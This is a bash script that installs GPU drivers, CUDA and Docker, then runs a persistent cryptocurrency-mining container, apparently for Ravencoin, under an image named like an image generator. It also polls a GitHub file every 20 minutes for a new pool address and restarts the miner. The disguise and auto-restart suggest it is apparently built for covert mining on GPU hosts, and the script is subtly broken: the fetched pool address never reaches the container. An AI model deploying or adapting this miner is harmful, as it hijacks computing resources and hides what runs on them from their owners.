#!/bin/bash

# CUDA + GPU setup flag
CUDA_FLAG="/var/tmp/cuda_installed"

# 1. Install NVIDIA driver, CUDA, Docker, and GPU container runtime
if [ ! -f "$CUDA_FLAG" ]; then
    echo "🚀 Installing CUDA, Docker, and NVIDIA container runtime..."

    # Update and install NVIDIA driver
    sudo apt update && sudo apt install -y ubuntu-drivers-common
    sudo ubuntu-drivers install

    # Install CUDA Toolkit
    sudo wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu2404/x86_64/cuda-keyring_1.1-1_all.deb
    sudo apt install -y ./cuda-keyring_1.1-1_all.deb
    sudo apt update
    sudo apt -y install cuda-toolkit-11-8
    sudo apt -y full-upgrade

    # Install Docker
    sudo apt-get install -y \
        apt-transport-https \
        ca-certificates \
        curl \
        software-properties-common
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
    echo "deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
    sudo apt-get update
    sudo apt-get install -y docker-ce docker-ce-cli containerd.io

    # Install NVIDIA Container Toolkit
    distribution=$(. /etc/os-release;echo $ID$VERSION_ID)
    curl -s -L https://nvidia.github.io/libnvidia-container/gpgkey | sudo gpg --dearmor -o /usr/share/keyrings/nvidia-container-toolkit.gpg
    curl -s -L https://nvidia.github.io/libnvidia-container/$distribution/libnvidia-container.list | \
      sed 's#https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit.gpg] https://#' | \
      sudo tee /etc/apt/sources.list.d/nvidia-container-toolkit.list

    sudo apt-get update
    sudo apt-get install -y nvidia-container-toolkit

    # Configure Docker to use NVIDIA runtime
    sudo mkdir -p /etc/docker
    cat <<EOF | sudo tee /etc/docker/daemon.json
{
  "default-runtime": "nvidia",
  "runtimes": {
    "nvidia": {
      "path": "nvidia-container-runtime",
      "runtimeArgs": []
    }
  }
}
EOF

    # Restart Docker
    sudo systemctl restart docker

    # Confirm GPU setup (this will show on logs)
    echo "✅ GPU Test Output:"
    docker run --rm --gpus all nvidia/cuda:12.2.0-base-ubuntu22.04 nvidia-smi || echo "❌ GPU test failed."

    # Mark install done
    sudo touch "$CUDA_FLAG"

    echo "✅ Installation complete. Rebooting..."
    sudo reboot
    exit 0
fi

# Mining loop start
echo "📦 Verifying GPU availability..."
docker run --rm --gpus all nvidia/cuda:12.2.0-base-ubuntu22.04 nvidia-smi || {
    echo "❌ GPU not working with Docker! Exiting."
    exit 1
}

# Stop old container if exists
docker stop rvn-test 2>/dev/null
docker rm rvn-test 2>/dev/null

# Start mining container
echo "🚀 Starting mining container with GPU..."
docker run --gpus all -d --restart unless-stopped --name rvn-test riccorg/imagegenv4:latest

# Function to check for pool updates
update_and_restart() {
    new_pool_url=$(curl -s https://raw.githubusercontent.com/anhacvai11/bash/refs/heads/main/ip)
    if [ "$new_pool_url" != "$POOL_URL" ]; then
        echo "🔁 Pool updated. Restarting container..."
        export POOL_URL=$new_pool_url
        docker stop rvn-test 2>/dev/null
        docker rm rvn-test 2>/dev/null
        docker run --gpus all -d --restart unless-stopped --name rvn-test riccorg/imagegenv4:latest
    else
        echo "✔️ No pool update."
    fi
}

# Wait before entering loop
sleep 10

# Check every 20 minutes
while true; do
    sleep 1200
    update_and_restart
done
